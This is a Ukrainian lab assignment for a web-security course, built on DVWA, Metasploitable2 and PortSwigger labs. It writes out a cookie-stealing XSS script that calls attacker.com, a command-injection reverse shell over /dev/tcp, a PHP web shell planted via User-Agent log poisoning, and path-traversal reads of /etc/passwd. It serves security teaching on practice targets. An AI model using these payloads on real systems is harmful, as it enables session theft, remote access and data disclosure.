# 🛡️ Lab 3: XSS, RCE, LFI, ffuf та словники (PayloadsAllTheThings, SecLists)

## 📘 Середовище для виконання
- **Metasploitable2** + **DVWA (Damn Vulnerable Web Application)**
- **PortSwigger Web Security Academy** (https://portswigger.net/web-security)

---

## 📚 Теми

### 1. Cross-Site Scripting (XSS)

#### 🎯 Завдання на DVWA:
1. Перейдіть до розділу **DVWA → XSS (Reflected)**:
   - Використайте прості payload-и: `<script>alert(1)</script>`.
   - Обхід фільтрів: `"><script>alert('XSS')</script>`, `javascript:alert(1)`.

2. Перейдіть до **XSS (Stored)**:
   - Спробуйте вставити XSS у повідомлення коментарів або гостьову книгу.
   - Тестування зловмисного JavaScript для крадіжки cookie:
     ```html
     <script>new Image().src="http://attacker.com/log?c="+document.cookie</script>
     ```
   - Результат - отримані cookie у себе на webhook. [interactsh](https://app.interactsh.com/#/)

#### 🧪 PortSwigger Labs:
- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- Спробуйте пройти хоча б **3 лаби по XSS**.

---

### 2. Remote Code Execution (RCE)

#### 🎯 Завдання на DVWA:
1. Перейдіть до **DVWA → Command Injection**:
   - Введіть `127.0.0.1; whoami` і досліджуйте вивід.
   - Інші корисні команди: `id`, `uname -a`, `cat /etc/passwd`.
   - Спробуйте підключення зворотного шелу:
     ```bash
     127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
     ```

2. Підніміть слухач:
   ```bash
   nc -lvnp 4444
   ```

#### 🧪 PortSwigger Labs:
- [OS command injection](https://portswigger.net/web-security/os-command-injection)

---

### 3. Ffuf (Fuzz Faster U Fool)

#### 🛠 Завдання:
1. Проскануйте доступні директорії:
   ```bash
   ffuf -u http://<DVWA-IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
   ```

2. Сканування параметрів:
   ```bash
   ffuf -u http://<DVWA-IP>/index.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/{}.txt
   ```
---

### 4. Словники: PayloadsAllTheThings + SecLists

#### 📁 Практика:
- Вивчіть структуру словників у:
  - `Seclists/`
  - `PayloadsAllTheThings`

- Використайте наступні словники:
  - `XSS`: `/PayloadsAllTheThings/XSS Injection/`
  - `RCE`: `/PayloadsAllTheThings/Command Injection/`
  - `Brute-force`: `/SecLists/Passwords/Leaked-Databases/rockyou.txt`

---

### 5. Local File Inclusion (LFI) / Path Traversal

#### 🎯 Завдання на DVWA:
1. Перейдіть до розділу **DVWA → File Inclusion**:
   - Введіть `../../../../etc/passwd` у параметр файлу.
   - Протестуйте подвійне кодування: `%252e%252e%252fetc%252fpasswd`.
   - Пошукайте інші файли, наприклад:
     - `/proc/self/environ`
     - `/var/log/apache2/access.log`

2. Спроба інжекції з логів (працює не завжди і не всюди - один із варіантів векторів для атаки):
   - Вставте шкідливий User-Agent у заголовок:
     ```bash
     curl -A "<?php system($_GET['cmd']); ?>" http://<DVWA-IP>/
     ```
   - Потім зверніться до `/var/log/apache2/access.log?cmd=id`
   
3. Спробувати атаки через PHP Wrapper (якщо сервер має фільтрацію LFI)
   - Введіть `php://filter/convert.base64-encode/resource=../../../../../etc/passwd` у параметр файлу.
   - Отримаємо вивід даних у кодуванні base64

#### 🧪 PortSwigger Labs:
- [File path traversal vulnerabilities](https://portswigger.net/web-security/file-path-traversal)
- Виконайте хоча б **2 лаби**, включаючи LFI до sensitive files.

---

## 📌 Звітність:
Для кожного завдання:
- Надішліть скріншоти payload'ів та результатів.
- Поясніть, що саме відбулось.
- Якщо були труднощі — коротко опишіть їх.

---

✅ **Рекомендація**: Виконуйте завдання в режимі **Medium** або **High** складності DVWA, якщо вже ознайомлені з логікою на Low.


